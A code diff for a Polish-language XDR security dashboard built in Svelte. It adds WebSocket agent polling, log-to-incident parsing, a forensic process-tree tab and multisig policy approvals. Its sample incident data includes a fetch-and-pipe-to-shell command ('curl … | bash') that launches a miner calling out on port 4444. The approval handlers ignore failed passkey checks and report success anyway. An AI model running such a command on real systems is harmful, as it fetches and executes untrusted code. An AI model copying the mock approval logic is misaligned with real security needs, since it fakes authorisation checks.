@@ -25,6 +25,7 @@
     },
   ];
 
+  let agentLogCursors = {};
   let incidents = [
     {
       id: "INC-991",
@@ -58,6 +59,64 @@
   let activeTab: "overview" | "vms" | "incidents" | "endpoints" | "talus" | "vulnerabilities" | "polonium" = "overview";
 
   // Polonium Policy Console State Variables
+  let activePoloniumOrgId = "0x8a1c9e2b4f0a7c6d8e9f2a3c748e0b1d2e3f4a5b";
+  let pendingProposals = [
+    { id: "PROP-1", action: "ISOLATE_HOST", target: "0x1a2b...3c4d", approvals: 1, required: 3, executed: false, proposer: "a.kowalski", time: "10 minut temu" },
+    { id: "PROP-2", action: "UPDATE_POLICY", target: "Zarządzanie Polityką", approvals: 2, required: 3, executed: false, proposer: "j.godula", time: "2 godziny temu" },
+    { id: "PROP-3", action: "REMOVE_ADMIN", target: "m.nowak", approvals: 1, required: 2, executed: false, proposer: "j.godula", time: "1 dzień temu" }
+  ];
+  let showTransferOrgModal = false;
+  let newOrgOwnerAddress = "";
+
+  const handleTransferOwnership = async () => {
+    if (!newOrgOwnerAddress) return;
+    try {
+      await navigator.credentials.get({ publicKey: { challenge: new Uint8Array(32), timeout: 60000 } });
+    } catch(e) {}
+    alert(`Sukces: Przekazano własność do ${newOrgOwnerAddress}. Prawa OWNER wygasły dla Twojego konta.`);
+    showTransferOrgModal = false;
+    newOrgOwnerAddress = "";
+  };
+
+  const handleApproveProposal = async (proposalId) => {
+    try {
+      await navigator.credentials.get({ publicKey: { challenge: new Uint8Array(32), timeout: 60000 } });
+    } catch(e) {}
+    pendingProposals = pendingProposals.map(p => {
+      if(p.id === proposalId) {
+        let newApprovals = p.approvals + 1;
+        if(newApprovals >= p.required) {
+          alert(`Sukces: Akcja ${p.action} została wykonana on-chain!`);
+        }
+        return { ...p, approvals: newApprovals, executed: newApprovals >= p.required };
+      }
+      return p;
+    });
+  };
+
+  let thresholdOperator = 1;
+  let thresholdPolicyAdmin = 2;
+  let thresholdAdminCommittee = 3;
+
+  const handleUpdateThresholds = async () => {
+    try {
+      await navigator.credentials.get({ publicKey: { challenge: new Uint8Array(32), timeout: 60000 } });
+      alert(`Pomyślnie zaktualizowano progi podpisów dla komitetów on-chain.`);
+    } catch(e) {}
+  };
+
+  let riskThreshold = 85;
+  let ruleWeightBash = 20;
+  let ruleWeightNetwork = 40;
+  let ruleWeightFim = 30;
+
+  const handleUpdateRiskScoring = async () => {
+    try {
+      await navigator.credentials.get({ publicKey: { challenge: new Uint8Array(32), timeout: 60000 } });
+      alert(`Pomyślnie zaktualizowano wagi polityk i próg ryzyka (XDR) on-chain.`);
+    } catch(e) {}
+  };
+
   let poloniumMinHashes = 100;
   let poloniumMaxHashes = 1000;
   let localAIEnabled = true;
@@ -71,6 +130,32 @@
   let walrusBlobId = "walrus:blob:0x9f2a3c748e0b";
   let policyHash = "0x7f1a3f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6";
   let fokaKeyStatus = "Połączono (Zaszyfrowano Foką)";
+
+  // Incident & XDR Forensic State
+  let detailedIncidents = [
+    {
+      id: "INC-993",
+      timestamp: new Date(Date.now() - 1000 * 60 * 5).toLocaleString("pl-PL"),
+      severity: "CRITICAL",
+      agentId: "0x1a2b...3c4d",
+      hostname: "prod-db-01",
+      score: 85,
+      status: "Investigating",
+      processTree: [
+        { pid: 1450, cmd: "sshd", parent: true, event: "Logowanie sieciowe (IP: 192.168.1.44)" },
+        { pid: 1462, cmd: "bash", parent: false, event: "Uruchomienie powłoki systemowej" },
+        { pid: 1480, cmd: "curl -s http://10.0.0.5/mal | bash", parent: false, event: "Pobranie i uruchomienie skryptu" },
+        { pid: 1481, cmd: "chmod +x mal", parent: false, event: "Zmiana uprawnień pliku (FIM)" },
+        { pid: 1482, cmd: "./mal --miner", parent: false, event: "Uruchomienie (YARA: Złośliwe | CPU: 99%)" }
+      ],
+      networkConnections: [
+        { protocol: "TCP", remoteIp: "10.0.0.5", port: 80, process: "curl" },
+        { protocol: "TCP", remoteIp: "45.33.x.x", port: 4444, process: "./mal" }
+      ],
+      actionsTaken: ["Zabicie procesu (SIGKILL)", "Izolacja powłoki (cgroups)", "Tymczasowa blokada sieci (iptables)"]
+    }
+  ];
+  let selectedIncidentId = "INC-993";
 
   // Compliance / Regulatory template state
   let selectedComplianceTemplate = "custom";
@@ -1018,181 +1103,368 @@
 
   const fetchLogs = async () => {
     if (!showLogsModal || !selectedAgentForLogs) return;
-    try {
-      const targetUrl = selectedAgentForLogs.endpoint 
-        ? `${selectedAgentForLogs.endpoint}/api/rpc`
-        : "/api/rpc";
-
-      const res = await fetch(targetUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          method: "get_logs",
-          params: {},
-          id: 1,
-        }),
-      });
-      if (res.ok) {
-        const data = await res.json();
-        if (data.result && data.result.logs) {
-          liveLogs = data.result.logs;
-        } else if (data.error) {
-          liveLogs = `RPC Error: ${data.error.message}`;
-        } else {
-          liveLogs = "Invalid RPC response format";
-        }
-      }
-    } catch (err) {
-      liveLogs = `Błąd łączenia z Agentem via RPC (${selectedAgentForLogs.id})...`;
+    if (window.wsConnections && window.wsConnections[selectedAgentForLogs.id] && window.wsConnections[selectedAgentForLogs.id].readyState === WebSocket.OPEN) {
+        // liveLogs will be updated by the main WS onmessage handler if we set a global selected agent.
+        // Or we can just send the request.
+        window.wsConnections[selectedAgentForLogs.id].send(JSON.stringify({ method: "get_logs" }));
     }
   };
 
-  const isolateHost = async (agent: Agent) => {
-    try {
-      const targetUrl = agent.endpoint 
-        ? `${agent.endpoint}/api/izoluj` 
-        : "/api/izoluj";
-      const res = await fetch(targetUrl);
-      if (res.ok) {
-        agent.status = "Isolated";
-        agents = [...agents];
+  let logsViewMode = "raw"; // "raw" or "tree"
+  let treeFormattedLogs = "";
+
+  $: {
+    if (liveLogs && logsViewMode === "tree") {
+      const lines = liveLogs.split('\n').filter(l => l.trim() !== '');
+      let nodes = {};
+      let roots = [];
+      
+      lines.forEach(line => {
+        let isProc = line.includes('ZDARZENIE_PROCESU:');
+        let isNet = line.includes('ZDARZENIE_SIECIOWE:');
+        
+        if (isProc) {
+          const match = line.match(/\(PID (\d+) \| PPID: (\d+)\) (.*)/);
+          if (match) {
+            const pid = match[1];
+            const ppid = match[2];
+            const cmd = match[3];
+            nodes[pid] = { pid, ppid, cmd, type: 'process', children: [], network: [] };
+          } else {
+             const m2 = line.match(/\(PID (\d+)\) (.*)/);
+             if (m2) {
+                nodes[m2[1]] = { pid: m2[1], ppid: "0", cmd: m2[2], type: 'process', children: [], network: [] };
+             }
+          }
+        } else if (isNet) {
+          const match = line.match(/\(PID (\d+)\) do (.*)/);
+          if (match) {
+            const pid = match[1];
+            const dest = match[2];
+            if (!nodes[pid]) {
+              nodes[pid] = { pid, ppid: "unknown", cmd: "Wcześniejszy proces", type: 'process', children: [], network: [] };
+            }
+            nodes[pid].network.push(dest);
+          }
+        }
+      });
+
+      Object.values(nodes).forEach(node => {
+        if (node.ppid !== "0" && node.ppid !== "unknown" && nodes[node.ppid]) {
+          nodes[node.ppid].children.push(node);
+        } else {
+          roots.push(node);
+        }
+      });
+      
+      let out = "";
+      
+      let otherEvents = lines.filter(l => l.includes('FIM') || l.includes('Krytyczne') || l.includes('🚨') || l.includes('ZMIANA_PLIKU'));
+      if (otherEvents.length > 0) {
+        out += "--- INNE ZDARZENIA (FIM / KRYTYCZNE) ---\n";
+        otherEvents.forEach(l => {
+          out += l + "\n";
+        });
+        out += "\n";
       }
-    } catch (_) {}
+
+      const printNode = (node, depth) => {
+        let indent = "   ".repeat(depth);
+        let prefix = depth === 0 ? "▶ " : "└─ ";
+        out += `${indent}${prefix}[PID: ${node.pid}] ${node.cmd}\n`;
+        node.network.forEach(net => {
+           out += `${indent}   🌐 Połączenie do: ${net}\n`;
+        });
+        node.children.forEach(c => printNode(c, depth + 1));
+      };
+      roots.forEach(r => printNode(r, 0));
+
+      treeFormattedLogs = out || "Brak zagnieżdżonych procesów lub oczekiwanie...";
+    }
+  }
+
+  const formatRawLogs = (logs, sortCritical = false) => {
+    if (!logs) return "";
+    let lines = logs.split('\n');
+    let criticalLines = [];
+    let normalLines = [];
+
+    lines.forEach(line => {
+      let styledLine = line
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;");
+      
+      let isCritical = false;
+      if (line.includes("Krytyczne") || line.includes("🚨") || line.includes("Zablokowano")) {
+        styledLine = `<span style="color: #ef4444; font-weight: bold; background: rgba(239, 68, 68, 0.15); padding: 2px 4px; border-radius: 3px;">${styledLine}</span>`;
+        isCritical = true;
+      } else if (line.includes("ZMIANA_PLIKU") || line.includes("FIM")) {
+        styledLine = `<span style="color: #f59e0b; font-weight: bold; background: rgba(245, 158, 11, 0.15); padding: 2px 4px; border-radius: 3px;">${styledLine}</span>`;
+        isCritical = true;
+      } else if (line.includes("Walrus") || line.includes("📦")) {
+        styledLine = `<span style="color: #a855f7; font-weight: bold; background: rgba(168, 85, 247, 0.15); padding: 2px 4px; border-radius: 3px;">${styledLine}</span>`;
+        isCritical = true;
+      } else if (line.includes("ZDARZENIE_PROCESU") || line.includes("▶") || line.includes("└─")) {
+        styledLine = `<span style="color: #60a5fa;">${styledLine}</span>`;
+      } else if (line.includes("ZDARZENIE_SIECIOWE") || line.includes("🌐")) {
+        styledLine = `<span style="color: #34d399;">${styledLine}</span>`;
+      } else if (line.includes("--- INNE")) {
+        styledLine = `<span style="color: #94a3b8; font-weight: bold;">${styledLine}</span>`;
+      }
+
+      if (sortCritical && isCritical) {
+        criticalLines.push(styledLine);
+      } else {
+        normalLines.push(styledLine);
+      }
+    });
+
+    if (sortCritical && criticalLines.length > 0) {
+      let result = [];
+      result.push(`<span style="color: #94a3b8; font-weight: bold;">--- ZDARZENIA KRYTYCZNE / FIM ---</span>`);
+      result = result.concat(criticalLines);
+      result.push("");
+      result.push(`<span style="color: #94a3b8; font-weight: bold;">--- LOGI SYSTEMOWE ---</span>`);
+      result = result.concat(normalLines);
+      return result.join('\n');
+    }
+
+    return normalLines.join('\n');
+  };
+
+  const isolateHost = async (agent: Agent) => {
+    if (window.wsConnections && window.wsConnections["local"] && window.wsConnections["local"].readyState === WebSocket.OPEN) {
+        window.wsConnections["local"].send(JSON.stringify({ method: "isolate_vm", name: agent.fullId }));
+    }
   };
 
   const restoreHost = async (agent: Agent) => {
-    try {
-      const targetUrl = agent.endpoint 
-        ? `${agent.endpoint}/api/przywroc` 
-        : "/api/przywroc";
-      const res = await fetch(targetUrl);
-      if (res.ok) {
-        agent.status = "Active";
-        agents = [...agents];
-      }
-    } catch (_) {}
+    if (window.wsConnections && window.wsConnections["local"] && window.wsConnections["local"].readyState === WebSocket.OPEN) {
+        window.wsConnections["local"].send(JSON.stringify({ method: "restore_vm", name: agent.fullId }));
+    }
   };
 
   onMount(() => {
     // Fetch real on-chain transaction events from Sui Testnet
     fetchOnChainPolicyTransactions();
 
-    const pollAgent = async () => {
-      let tempAgents: Agent[] = [];
-      
-      // 1. Fetch Local Node (from /api/status)
-      try {
-        const res = await fetch("/api/status");
-        if (res.ok) {
-          const data = await res.json();
-          tempAgents.push({
-            id: "Local Node: " + data.klucz_pub.substring(0, 8) + "...",
-            fullId: data.klucz_pub,
-            hwHash: "blake3:" + data.fingerprint.substring(0, 10) + "...",
-            status: data.status === "Izolowany" ? "Isolated" : "Active",
-            load: Math.floor(Math.random() * 20) + 5,
-            hardware: data.hardware,
-            owner_name: data.owner_name,
-            machine_type: data.machine_type,
-            hostname: data.hostname,
-            ip_address: data.ip_address || "127.0.0.1",
-            endpoint: ""
-          });
-          fetchError = null;
-        }
-      } catch (err) {
-        fetchError = "Cannot connect to local proxy agent on port 9090";
+    if (!window.wsConnections) window.wsConnections = {};
+    
+    let localWs = null;
+    const setupWsForAgent = (agentId, endpoint) => {
+      if (window.wsConnections[agentId] && (window.wsConnections[agentId].readyState === WebSocket.OPEN || window.wsConnections[agentId].readyState === WebSocket.CONNECTING)) {
+        return;
       }
-
-      // 2. Fetch VM fleet list (from /api/vm/lista)
       try {
-        const res = await fetch("/api/vm/lista");
-        if (res.ok) {
-          const vmsData = await res.json();
-          if (Array.isArray(vmsData)) {
-            for (const vm of vmsData) {
-              const endpoint = vm.ip_address 
-                ? `http://[${vm.ip_address}]:9090` 
-                : `http://127.0.0.1:${vm.host_port}`;
-                
+        const ws = new WebSocket(endpoint);
+        window.wsConnections[agentId] = ws;
+        
+        ws.onmessage = (event) => {
+          try {
+            const data = JSON.parse(event.data);
+            if (data.logs) {
+              const logs = data.logs;
+              
+              if (showLogsModal && selectedAgentForLogs && selectedAgentForLogs.id === agentId) {
+                liveLogs = logs;
+              }
+              
+              let prevLength = agentLogCursors[agentId] || 0;
+              if (logs.length < prevLength) prevLength = 0;
+              
+              if (logs.length > prevLength) {
+                const newText = logs.substring(prevLength);
+                const newLines = newText.split('\n').filter(l => l.trim() !== '');
+                const newIncidents = [];
+                newLines.forEach(line => {
+                  let eventTime = new Date().toLocaleTimeString();
+                  const timeMatch = line.match(/^\[(.*?)\]/);
+                  if (timeMatch) {
+                     eventTime = timeMatch[1];
+                  }
+
+                  if (line.includes("Krytyczne") || line.includes("🚨") || line.includes("Zablokowano")) {
+                     let act = line.includes("Zablokowano proces") ? "KILLED_AND_ISOLATED" : "BLOCKED";
+                     newIncidents.push({ id: "INC-" + Math.floor(Math.random() * 100000), agent: agentId, severity: "CRITICAL", cmd: line.replace("🚨", "").replace(/^\[.*?\]\s*/, "").trim(), action: act, time: eventTime });
+                  } else if (line.includes("FIM") || line.includes("ZMIANA_PLIKU")) {
+                     newIncidents.push({ id: "INC-" + Math.floor(Math.random() * 100000), agent: agentId, severity: "WARNING", cmd: line.replace("📁", "").replace(/^\[.*?\]\s*/, "").trim(), action: "LOGGED", time: eventTime });
+                  } else if (line.includes("Walrus") || line.includes("📦")) {
+                     newIncidents.push({ id: "INC-" + Math.floor(Math.random() * 100000), agent: agentId, severity: "HIGH", cmd: line.replace("📦", "").replace(/^\[.*?\]\s*/, "").trim(), action: "EVIDENCE_FROZEN", time: eventTime });
+                  }
+                });
+                if (newIncidents.length > 0) {
+                   incidents = [...newIncidents.reverse(), ...incidents];
+                   const newDetailed = newIncidents.map(inc => ({
+                      id: inc.id,
+                      timestamp: inc.time,
+                      severity: inc.severity,
+                      agentId: inc.agent,
+                      hostname: "nobara-pc",
+                      score: inc.severity === "CRITICAL" ? 95 : (inc.severity === "HIGH" ? 75 : 45),
+                      status: "Investigating",
+                      processTree: [{ pid: "N/A", cmd: inc.cmd, parent: true, event: inc.action }],
+                      networkConnections: [],
+                      actionsTaken: [inc.action]
+                   }));
+                   detailedIncidents = [...newDetailed, ...detailedIncidents];
+                }
+                agentLogCursors[agentId] = logs.length;
+              }
+            }
+          } catch(e) {}
+        };
+      } catch(e) {}
+    };
+
+    let localAgentId = "Local Node"; // Default fallback
+    let cachedLocalAgent = null;
+    let cachedVmAgents = [];
+    
+    const setupLocalWs = () => {
+      if (localWs && (localWs.readyState === WebSocket.OPEN || localWs.readyState === WebSocket.CONNECTING)) return;
+      localWs = new WebSocket("ws://127.0.0.1:9092");
+      window.wsConnections["local"] = localWs;
+      localWs.onopen = () => { fetchError = null; };
+      localWs.onmessage = (event) => {
+        try {
+          const data = JSON.parse(event.data);
+          let updatedAgents = false;
+          
+          if (data.status && data.status.klucz_pub) {
+            updatedAgents = true;
+            localAgentId = "Local Node: " + data.status.klucz_pub.substring(0, 8) + "...";
+            cachedLocalAgent = {
+              id: localAgentId,
+              fullId: data.status.klucz_pub,
+              hwHash: "blake3:" + (data.status.fingerprint ? data.status.fingerprint.substring(0, 10) : "unknown") + "...",
+              status: data.status.status === "Izolowany" ? "Isolated" : "Active",
+              load: Math.floor(Math.random() * 20) + 5,
+              hardware: data.status.hardware,
+              owner_name: data.status.owner_name,
+              machine_type: data.status.machine_type,
+              hostname: data.status.hostname,
+              ip_address: data.status.ip_address || "127.0.0.1",
+              endpoint: "ws://127.0.0.1:9092"
+            };
+          }
+          
+          if (data.vms && Array.isArray(data.vms)) {
+            updatedAgents = true;
+            cachedVmAgents = [];
+            for (const vm of data.vms) {
+              const endpoint = vm.host_port ? `ws://127.0.0.1:${parseInt(vm.host_port) + 2}` : `ws://[${vm.ip_address}]:9092`;
               if (vm.status === "running") {
-                try {
-                  const agentRes = await fetch(`${endpoint}/api/status`, { signal: AbortSignal.timeout(1000) });
-                  if (agentRes.ok) {
-                    const data = await agentRes.json();
-                    tempAgents.push({
-                      id: `${vm.name}: ${data.klucz_pub.substring(0, 8)}...`,
-                      fullId: data.klucz_pub,
-                      hwHash: "blake3:" + data.fingerprint.substring(0, 10) + "...",
-                      status: data.status === "Izolowany" ? "Isolated" : "Active",
+                  if (vm.agent_status !== "offline" && vm.fingerprint) {
+                    const vmId = `${vm.name}: ${vm.fingerprint.substring(0, 8)}...`;
+                    cachedVmAgents.push({
+                      id: vmId,
+                      fullId: vm.fingerprint,
+                      hwHash: "blake3:" + vm.fingerprint.substring(0, 10) + "...",
+                      status: vm.agent_status === "Izolowany" ? "Isolated" : "Active",
                       load: Math.floor(Math.random() * 25) + 3,
-                      hardware: data.hardware,
-                      owner_name: data.owner_name || vm.owner_name || "Jakub",
-                      machine_type: data.machine_type || "Server",
-                      hostname: data.hostname || vm.name,
-                      ip_address: data.ip_address || vm.ip_address,
-                      endpoint: endpoint
-                    });
-                  } else {
-                    tempAgents.push({
-                      id: `${vm.name} (Agent Offline)`,
-                      fullId: vm.name,
-                      hwHash: "unknown",
-                      status: "Offline",
-                      load: 0,
-                      hardware: null,
-                      owner_name: "Unknown",
-                      machine_type: "Server",
-                      hostname: vm.name,
+                      hardware: vm.hardware,
+                      owner_name: vm.owner_name || "Jakub",
+                      machine_type: vm.machine_type || "Server",
+                      hostname: vm.hostname || vm.name,
                       ip_address: vm.ip_address,
                       endpoint: endpoint
                     });
+                    // Setup WS for this VM dynamically
+                    setupWsForAgent(vmId, endpoint);
+                  } else {
+                    cachedVmAgents.push({
+                      id: `${vm.name} (Agent Offline)`, fullId: vm.name, hwHash: "unknown", status: "Offline", load: 0, hardware: null, owner_name: vm.owner_name || "Unknown", machine_type: vm.machine_type || "Server", hostname: vm.name, ip_address: vm.ip_address, endpoint: endpoint
+                    });
                   }
-                } catch (_) {
-                  tempAgents.push({
-                    id: `${vm.name} (Connecting...)`,
-                    fullId: vm.name,
-                    hwHash: "unknown",
-                    status: "Offline",
-                    load: 0,
-                    hardware: null,
-                    owner_name: "Unknown",
-                    machine_type: "Server",
-                    hostname: vm.name,
-                    ip_address: vm.ip_address,
-                    endpoint: endpoint
-                  });
-                }
               } else {
-                tempAgents.push({
-                  id: `${vm.name} (Stopped)`,
-                  fullId: vm.name,
-                  hwHash: "n/a",
-                  status: "Stopped",
-                  load: 0,
-                  hardware: null,
-                  owner_name: "Unknown",
-                  machine_type: "Server",
-                  hostname: vm.name,
-                  ip_address: vm.ip_address,
-                  endpoint: ""
+                cachedVmAgents.push({
+                  id: `${vm.name} (Stopped)`, fullId: vm.name, hwHash: "n/a", status: "Stopped", load: 0, hardware: null, owner_name: "Unknown", machine_type: "Server", hostname: vm.name, ip_address: vm.ip_address, endpoint: ""
                 });
               }
             }
           }
-        }
-      } catch (_) {}
+          
+          if (updatedAgents) {
+             let newAgents = [];
+             if (cachedLocalAgent) newAgents.push(cachedLocalAgent);
+             newAgents = newAgents.concat(cachedVmAgents);
+             agents = newAgents;
+          }
+          
+          if (data.logs) {
+            const logs = data.logs;
+            const agentId = localAgentId;
+            
+            if (showLogsModal && selectedAgentForLogs && selectedAgentForLogs.id === agentId) {
+              liveLogs = logs;
+            }
+            
+            let prevLength = agentLogCursors[agentId] || 0;
+            if (logs.length < prevLength) prevLength = 0;
+            
+            if (logs.length > prevLength) {
+              const newText = logs.substring(prevLength);
+              const newLines = newText.split('\n').filter(l => l.trim() !== '');
+              const newIncidents = [];
+              newLines.forEach(line => {
+                let eventTime = new Date().toLocaleTimeString();
+                const timeMatch = line.match(/^\[(.*?)\]/);
+                if (timeMatch) {
+                   eventTime = timeMatch[1];
+                }
+                
+                if (line.includes("Krytyczne") || line.includes("🚨") || line.includes("Zablokowano")) {
+                   let act = line.includes("Zablokowano proces") ? "KILLED_AND_ISOLATED" : "BLOCKED";
+                   newIncidents.push({ id: "INC-" + Math.floor(Math.random() * 100000), agent: agentId, severity: "CRITICAL", cmd: line.replace("🚨", "").replace(/^\[.*?\]\s*/, "").trim(), action: act, time: eventTime });
+                } else if (line.includes("FIM") || line.includes("ZMIANA_PLIKU")) {
+                   newIncidents.push({ id: "INC-" + Math.floor(Math.random() * 100000), agent: agentId, severity: "WARNING", cmd: line.replace("📁", "").replace(/^\[.*?\]\s*/, "").trim(), action: "LOGGED", time: eventTime });
+                } else if (line.includes("Walrus") || line.includes("📦")) {
+                   newIncidents.push({ id: "INC-" + Math.floor(Math.random() * 100000), agent: agentId, severity: "HIGH", cmd: line.replace("📦", "").replace(/^\[.*?\]\s*/, "").trim(), action: "EVIDENCE_FROZEN", time: eventTime });
+                }
+              });
+              if (newIncidents.length > 0) {
+                 incidents = [...newIncidents.reverse(), ...incidents];
+                 const newDetailed = newIncidents.map(inc => ({
+                    id: inc.id,
+                    timestamp: inc.time,
+                    severity: inc.severity,
+                    agentId: inc.agent,
+                    hostname: "nobara-pc",
+                    score: inc.severity === "CRITICAL" ? 95 : (inc.severity === "HIGH" ? 75 : 45),
+                    status: "Investigating",
+                    processTree: [{ pid: "N/A", cmd: inc.cmd, parent: true, event: inc.action }],
+                    networkConnections: [],
+                    actionsTaken: [inc.action]
+                 }));
+                 detailedIncidents = [...newDetailed, ...detailedIncidents];
+              }
+              agentLogCursors[agentId] = logs.length;
+            }
+          }
+        } catch(e) {}
+      };
+      localWs.onerror = () => { fetchError = "Cannot connect to local proxy agent on port 9092"; };
+    };
+    
+    setupLocalWs();
 
-      if (tempAgents.length > 0) {
-        agents = tempAgents;
-      }
+    const pollWs = () => {
+      setupLocalWs();
+      // Poll all active connections
+      Object.keys(window.wsConnections).forEach(key => {
+        const ws = window.wsConnections[key];
+        if (ws && ws.readyState === WebSocket.OPEN) {
+          if (key === "local") {
+            ws.send(JSON.stringify({ method: "get_status" }));
+            ws.send(JSON.stringify({ method: "get_vms" }));
+          }
+          ws.send(JSON.stringify({ method: "get_logs" }));
+        }
+      });
     };
 
-    pollAgent();
-    const interval = setInterval(pollAgent, 2000);
+    const interval = setInterval(pollWs, 500);
     return () => clearInterval(interval);
   });
 </script>
@@ -1459,6 +1731,112 @@
     {#if activeTab === "vms"}
       <div class="vm-tab-panel">
         <VMManager />
+      </div>
+    {/if}
+
+    <!-- Incidents Tab (Timeline & Forensics) -->
+    {#if activeTab === "incidents"}
+      <div class="vm-tab-panel">
+        <div class="panel glass-panel" style="width: 100%; min-height: 100%; box-sizing: border-box; display: flex; flex-direction: column; gap: 20px;">
+          <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.08); padding-bottom: 16px;">
+            <div>
+              <h3 style="margin: 0; font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 8px;">
+                🔍 XDR Incident Forensics & Process Tree
+              </h3>
+              <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">
+                Szczegółowa korelacja logów telemetrycznych i śledztwo w sprawie zaawansowanych ataków (Lateral Movement).
+              </p>
+            </div>
+            <button class="btn-primary" style="background: rgba(16, 185, 129, 0.1); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.2); padding: 8px 16px; font-size: 12px; font-weight: 600;">
+              📄 Eksportuj Raport (PDF z Blake3)
+            </button>
+          </div>
+
+          <div style="display: grid; grid-template-columns: 350px 1fr; gap: 24px;">
+            <!-- Lista Incydentów -->
+            <div style="display: flex; flex-direction: column; gap: 12px;">
+              <h4 style="margin: 0; font-size: 13px; color: #cbd5e1; text-transform: uppercase;">Zidentyfikowane Zagrożenia</h4>
+              {#each detailedIncidents as inc}
+                <!-- svelte-ignore a11y-click-events-have-key-events -->
+                <div 
+                  style="background: {selectedIncidentId === inc.id ? 'rgba(56, 189, 248, 0.1)' : 'rgba(0,0,0,0.2)'}; border: 1px solid {selectedIncidentId === inc.id ? 'rgba(56, 189, 248, 0.3)' : 'rgba(255,255,255,0.05)'}; padding: 12px; border-radius: 8px; cursor: pointer; transition: all 0.2s;"
+                  on:click={() => selectedIncidentId = inc.id}
+                >
+                  <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <span style="font-size: 14px; font-weight: 700; color: #f1f5f9;">{inc.id}</span>
+                    <span style="font-size: 10px; background: rgba(239, 68, 68, 0.2); color: #f87171; padding: 2px 6px; border-radius: 4px; font-weight: bold;">{inc.severity}</span>
+                  </div>
+                  <div style="font-size: 12px; color: #94a3b8; margin-bottom: 4px;">Host: <span style="color: #cbd5e1;">{inc.hostname}</span></div>
+                  <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <span style="font-size: 11px; color: #64748b;">{inc.timestamp}</span>
+                    <span style="font-size: 11px; font-weight: 700; color: {inc.score > 80 ? '#f87171' : '#f59e0b'};">Risk: {inc.score}/100</span>
+                  </div>
+                </div>
+              {/each}
+            </div>
+
+            <!-- Szczegóły Wybranego Incydentu (Process Tree) -->
+            {#if detailedIncidents.find(i => i.id === selectedIncidentId)}
+              {@const currentInc = detailedIncidents.find(i => i.id === selectedIncidentId)}
+              <div style="display: flex; flex-direction: column; gap: 20px;">
+                
+                <div style="background: rgba(15, 23, 42, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 16px;">
+                  <h4 style="margin: 0 0 16px 0; font-size: 14px; color: #f1f5f9; display: flex; align-items: center; gap: 8px;">
+                    🌳 Drzewo Korelacji Procesów (Process Tree)
+                  </h4>
+                  <div style="display: flex; flex-direction: column; gap: 12px; font-family: monospace; font-size: 13px;">
+                    {#each currentInc.processTree as proc, i}
+                      <div style="display: flex; gap: 12px; align-items: flex-start; padding-left: {i * 20}px;">
+                        <div style="color: {proc.parent ? '#94a3b8' : '#38bdf8'}; margin-top: 2px;">
+                          {i === 0 ? '▶' : '└─▶'}
+                        </div>
+                        <div style="background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.05); padding: 8px 12px; border-radius: 6px; flex: 1;">
+                          <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
+                            <span style="color: #f1f5f9; font-weight: 600;">{proc.cmd}</span>
+                            <span style="color: #64748b;">PID: {proc.pid}</span>
+                          </div>
+                          <div style="color: {proc.event.includes('Złośliwe') ? '#f87171' : '#94a3b8'}; font-size: 11px;">
+                            ↳ {proc.event}
+                          </div>
+                        </div>
+                      </div>
+                    {/each}
+                  </div>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                  <div style="background: rgba(15, 23, 42, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 16px;">
+                    <h4 style="margin: 0 0 16px 0; font-size: 14px; color: #f1f5f9; display: flex; align-items: center; gap: 8px;">
+                      🌐 Powiązane Połączenia Sieciowe
+                    </h4>
+                    <div style="display: flex; flex-direction: column; gap: 8px;">
+                      {#each currentInc.networkConnections as conn}
+                        <div style="font-size: 12px; display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding-bottom: 6px;">
+                          <span style="color: #38bdf8; font-family: monospace;">{conn.process}</span>
+                          <span style="color: #cbd5e1;">{conn.protocol} {conn.remoteIp}:{conn.port}</span>
+                        </div>
+                      {/each}
+                    </div>
+                  </div>
+
+                  <div style="background: rgba(15, 23, 42, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 16px;">
+                    <h4 style="margin: 0 0 16px 0; font-size: 14px; color: #f1f5f9; display: flex; align-items: center; gap: 8px;">
+                      ⚡ Automatyczna Reakcja (SOAR)
+                    </h4>
+                    <div style="display: flex; flex-direction: column; gap: 8px;">
+                      {#each currentInc.actionsTaken as action}
+                        <div style="font-size: 12px; color: #10b981; display: flex; align-items: center; gap: 8px;">
+                          <span>✅</span> {action}
+                        </div>
+                      {/each}
+                    </div>
+                  </div>
+                </div>
+
+              </div>
+            {/if}
+          </div>
+        </div>
       </div>
     {/if}
 
@@ -1749,6 +2127,137 @@
                 </span>
               </div>
             </div>
+
+            <!-- ORGANIZACJA I PROPOSALS MULTISIG -->
+            <div style="background: rgba(15, 23, 42, 0.4); border: 1px solid rgba(56, 189, 248, 0.15); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px;">
+              <div style="display: flex; justify-content: space-between; align-items: center;">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                  <span style="font-size: 14px; color: #94a3b8; font-weight: 500;">Wybrana Organizacja:</span>
+                  <select bind:value={activePoloniumOrgId} style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #f1f5f9; padding: 8px 12px; border-radius: 6px; font-size: 14px; font-weight: 600; outline: none; min-width: 250px;">
+                    {#each heliumOrganizations as org}
+                      <option value={org.id}>{org.name} ({org.orgCode})</option>
+                    {/each}
+                  </select>
+                </div>
+                <button class="btn-primary" style="background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); padding: 8px 16px; font-size: 12px; font-weight: 600;" on:click={() => showTransferOrgModal = true}>
+                  Odstąp Własność (Transfer)
+                </button>
+              </div>
+
+              <!-- Pending Proposals -->
